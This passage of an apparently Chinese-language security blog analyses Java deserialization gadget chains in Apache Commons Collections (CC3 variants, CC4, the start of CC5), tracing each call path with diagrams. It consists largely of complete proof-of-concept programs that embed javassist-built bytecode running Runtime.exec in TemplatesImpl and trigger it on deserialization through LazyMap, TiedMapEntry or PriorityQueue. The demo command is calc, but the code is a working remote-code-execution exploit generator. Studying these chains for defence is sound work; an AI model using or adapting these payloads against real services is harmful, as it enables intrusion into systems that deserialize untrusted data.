&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);        tmpl.newTransformer();//触发命令执行</code></pre><p>下一步就是寻找哪些地方可以调用<code>newTransformer()</code></p><p>这里使用的是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>这个类</p><pre><code class="java">public TrAXFilter(Templates templates)  throws        TransformerConfigurationException    &#123;        _templates = templates;        _transformer = (TransformerImpl) templates.newTransformer();        _transformerHandler = new TransformerHandlerImpl(_transformer);        _useServicesMechanism = _transformer.useServicesMechnism();    &#125;</code></pre><p>在这个类的构造方法种就调用了<code>newTransformer()</code>方法，<code>templates</code>参数可控</p><p>直接构造new TrAXFilter(tmpl);就能触发</p><p>下一步就是找到一个方法调用了<code>TrAXFilter</code>的构造方法</p><p>这里找到的是<code>org.apache.commons.collections.functors.InstantiateTransformer</code>的<code>transform</code>方法</p><pre><code class="java">public Object transform(Object input) &#123;        try &#123;            if (input instanceof Class == false) &#123;                throw new FunctorException(                    &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;                        + (input == null ? &quot;null object&quot; : input.getClass().getName()));            &#125;            Constructor con = ((Class) input).getConstructor(iParamTypes);            return con.newInstance(iArgs);        &#125; catch (NoSuchMethodException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);        &#125; catch (InstantiationException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex);        &#125; catch (IllegalAccessException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex);        &#125; catch (InvocationTargetException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex);        &#125;    &#125;</code></pre><p>其构造方法如下：</p><pre><code class="java">public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123;        super();        iParamTypes = paramTypes;        iArgs = args;    &#125;</code></pre><p>这个iParamTypes可控，说明<code>Constructor con = ((Class) input).getConstructor(iParamTypes);</code>可控，这条语句的意思是，获取指定参数类型的构造方法，然后使用构造函数的<code>newInstance()</code>方法创建对象的实例。<code>iArgs</code>表示实际传递给构造函数的参数列表</p><p>所以构造下面代码就可以命令执行了：</p><pre><code class="java">InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);instantiateTransformer.transform(TrAXFilter.class);</code></pre><p>这里和CC1一样，因为这个<code>transform</code>还需要传入一个参数<code>TrAXFilter.class</code>，这对后面的利用中参数控制带来一定的麻烦</p><p>于是又用上了<code>ConstantTransformer</code>这个类</p><pre><code class="java">public ConstantTransformer(Object constantToReturn) &#123;        super();        iConstant = constantToReturn;    &#125;</code></pre><pre><code class="java">public Object transform(Object input) &#123;        return iConstant;    &#125;</code></pre><p>这个类的<code>transform</code>方法直接返回构造函数的参数</p><p>再利用<code>ChainedTransformer</code>将这两个类串起来：</p><pre><code class="java">Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;ChainedTransformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(&#39;a&#39;);</code></pre><p>然后后面的链子就是CC1的内容了:</p><p>找到一个调用了<code>transform</code>的类，按照CC1的就是LazyMap()这个类的get()</p><pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;        return new LazyMap(map, factory);    &#125;protected LazyMap(Map map, Transformer factory) &#123;        super(map);        if (factory == null) &#123;            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);        &#125;        this.factory = factory;    &#125;public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>所以将<code>transformerChain.transform(&#39;a&#39;);</code>替换成：</p><pre><code class="java">Map map = new HashMap();Map lazyMap = LazyMap.decorate(map,transformerChain);lazyMap.get(&quot;a&quot;);</code></pre><h3 id="AnnotationInvocationHandler版本"><a href="#AnnotationInvocationHandler版本" class="headerlink" title="AnnotationInvocationHandler版本"></a>AnnotationInvocationHandler版本</h3><p>下一步就是寻找调用了get()的地方,然后找到了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>invoke</code></p><pre><code class="java">public Object invoke(Object var1, Method var2, Object[] var3) &#123;        String var4 = var2.getName();        Class[] var5 = var2.getParameterTypes();        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;            return this.equalsImpl(var3[0]);        &#125; else if (var5.length != 0) &#123;            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        &#125; else &#123;            switch (var4) &#123;                case &quot;toString&quot;:                    return this.toStringImpl();                case &quot;hashCode&quot;:                    return this.hashCodeImpl();                case &quot;annotationType&quot;:                    return this.type;                default:                    Object var6 = this.memberValues.get(var4);                    if (var6 == null) &#123;                        throw new IncompleteAnnotationException(this.type, var4);                    &#125; else if (var6 instanceof ExceptionProxy) &#123;                        throw ((ExceptionProxy)var6).generateException();                    &#125; else &#123;                        if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123;                            var6 = this.cloneArray(var6);                        &#125;                        return var6;                    &#125;            &#125;        &#125;    &#125;</code></pre><p>这个类的构造方法如下：this.memberValues 可控，设置 this.memberValues 为我们构造的 LazyMap，但是这里存在一个if判断，第一个参数类型必须是注解</p><pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;        Class[] var3 = var1.getInterfaces();        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;            this.type = var1;            this.memberValues = var2;        &#125; else &#123;            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);        &#125;    &#125;</code></pre><p>下一步就要想如何调用这个<code>invoke</code>方法</p><p>这部分涉及到 java 的动态代理。创建一个 AnnotationInvocationHandler 的代理类，当调用 AnnotationInvocationHandler 的代理类里的任意方法时都会先调用 AnnotationInvocationHandler#invoke() 方法，有点像php里的 _call() 只不过 _call() 在调用不存在的方法才触发</p><pre><code class="java">//实例一个 AnnotationInvocationHandler 类Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数construct.setAccessible(true);//这里第一个参数必须是注释类型的InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazyMap);// 创建 AnnotationInvocationHandler 的代理Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);//调用代理对象的任意方法proxyMap.size();</code></pre><p>这里可以调用任意方法触发，只要找到一个readObject有对我们的代理对象调用任意方法就行，最后使用的是AnnotationInvocationHandler的readObject方法</p><pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;        var1.defaultReadObject();        AnnotationType var2 = null;        try &#123;            var2 = AnnotationType.getInstance(this.type);        &#125; catch (IllegalArgumentException var9) &#123;            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);        &#125;        Map var3 = var2.memberTypes();        Iterator var4 = this.memberValues.entrySet().iterator();        while(var4.hasNext()) &#123;            Map.Entry var5 = (Map.Entry)var4.next();            String var6 = (String)var5.getKey();            Class var7 = (Class)var3.get(var6);            if (var7 != null) &#123;                Object var8 = var5.getValue();                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));                &#125;            &#125;        &#125;    &#125;</code></pre><p>这里需要再实例化一个AnnotationInvocationHandler 包裹的代理对象 proxyMap</p><pre><code class="java">handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);</code></pre><p>然后对这个类进行序列化和反序列化</p><pre><code class="java">serialize(handler);unserialize(&quot;ser.bin&quot;);</code></pre><p>利用链如下：</p><pre class="mermaid">graph TBA("sun.reflect.annotation.AnnotationInvocationHandler#\nreadObject()")-->B("sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()")B("sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()")-->C("org.apache.commons.collections.map.LazyMap#\nget()")C("org.apache.commons.collections.map.LazyMap#\nget()")-->D("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")D("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->E("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")E("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->F("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")F("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->K("Runtime.getRuntime.exec")</pre><p>最后的POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.HashMap;import java.util.Map;import java.util.PriorityQueue;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        Map map = new HashMap();        Map lazyMap = LazyMap.decorate(map,transformerChain);//        lazyMap.get(&quot;a&quot;);        //实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazyMap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法//        proxyMap.size();        // 再实例化一个 AnnotationInvocationHandler 包裹的代理对象 proxyMap        handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);        serialize(handler);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="TiedMapEntry版本"><a href="#TiedMapEntry版本" class="headerlink" title="TiedMapEntry版本"></a>TiedMapEntry版本</h3><p>接着上面LazyMap的get()方法，在CC1中还有另外一条路可走，那就是<code>TiedMapEntry</code>这个类</p><pre><code class="java">public Object getValue() &#123;        return map.get(key);    &#125;public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;public TiedMapEntry(Map map, Object key) &#123;        super();        this.map = map;        this.key = key;    &#125;</code></pre><p>这个<code>getValue</code>方法调用了get()方法，其中map可以通过构造函数赋值，<code>hashCode</code>方法调用了getValue方法</p><pre><code class="java">TiedMapEntry tiedmapentry= new TiedMapEntry(lazyMap,&quot;abc&quot;);tiedmapentry.hashCode();</code></pre><p>下一步就是寻找调用hashCode方法的地方</p><p>在<code>java.util.HashMap</code>, 可以构造<code>hash(tiedmapentry)</code></p><pre><code class="java">static final int hash(Object key) &#123;        int h;        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);    &#125;</code></pre><p>但是hash方法不是public类型，只能内部调用</p><p>正好这个类的readObject方法调用了这个hash,结束这个链子</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws IOException, ClassNotFoundException &#123;        // Read in the threshold (ignored), loadfactor, and any hidden stuff      .....            for (int i = 0; i &lt; mappings; i++) &#123;                @SuppressWarnings(&quot;unchecked&quot;)                    K key = (K) s.readObject();                @SuppressWarnings(&quot;unchecked&quot;)                    V value = (V) s.readObject();                putVal(hash(key), key, value, false, false);            &#125;        &#125;    &#125;</code></pre><p>整个调用链如下：</p><pre class="mermaid">graph TBA("java.util.HashMap#\nreadObject()")-->B("java.util.HashMap#\nhash()")B("java.util.HashMap#\nhash()")-->C("org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()")C("org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()")-->D("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")D("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->E("org.apache.commons.collections.map.LazyMap#\nget()")E("org.apache.commons.collections.map.LazyMap#\nget()")-->F("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")F("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->G("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")G("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->M("Runtime.getRuntime.exec")</pre><p>最后的POC</p><pre><code class="java">package org.example;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.HashMap;import java.util.Map;import java.util.PriorityQueue;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        Map map = new HashMap();        Map lazyMap = LazyMap.decorate(map,transformerChain);//        lazyMap.get(&quot;a&quot;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazyMap,&quot;abc&quot;);//        tiedmapentry.hashCode();        Map expMap=new HashMap();        expMap.put(tiedmapentry,&quot;valuevalue&quot;);        serialize(expMap);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>条件：</p><p>commons-collections4: 4.0</p><p>jdk: &lt;7u21</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;    &lt;/dependency&gt;&lt;dependency&gt;      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;      &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>CC4这条链子是CC2和CC3的结合，前半段用了CC2的PriorityQueue以及TransformingComparator，TransformingComparator本来应该调用InvokeTransformer的transform方法的，但是因为InvokeTransformer被ban掉了（CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化），所以用了CC3的chain，里面用的是InstantiateTransformer，用了InstantiateTransformer就必须要进行类实例的构造，也就和cc3后面一样了，也用了TrAXFilter来包装TemplatesImpl。</p><p>前面有分析了，这里就不再BB</p><p>这条链的前半段:</p><pre><code class="java">//构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);        transformerChain.transform(&#39;a&#39;);</code></pre><p>后半段是利用<code>org.apache.commons.collections4.comparators.TransformingComparator</code>的compare来调用这个transform()</p><p>然后就是CC2的内容了：</p><pre><code class="java">TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(transformerChain,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);        PriorityQueue queue = new PriorityQueue(2,transformingComparator);        queue.add(1);        queue.add(2);        serialize(queue);        unserialize(&quot;ser.bin&quot;);</code></pre><p>调用链如下：</p><pre class="mermaid">graph TBA("java.util.PriorityQueue#\nreadObject()") --> B("java.util.PriorityQueue#\nheapify()")B("java.util.PriorityQueue#\nheapify()")--> C("java.util.PriorityQueue#\nsiftDown()")C("java.util.PriorityQueue#\nsiftDown()")-->D("java.util.PriorityQueue#\nsiftDownUsingComparator()")D("java.util.PriorityQueue#\nsiftDownUsingComparator()")-->E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")-->F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")-->G("org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")G("org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->M("Runtime.getRuntime.exec")</pre><p>完整的POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(transformerChain,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);        PriorityQueue queue = new PriorityQueue(2,transformingComparator);        queue.add(1);        queue.add(2);        serialize(queue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>条件：</p><p>commons-collections:3.1-3.2.1</p><p>jdk1.8</p><p>因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以TiedMapEntry和BadAttributeValueExpException就被挖掘了出来</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      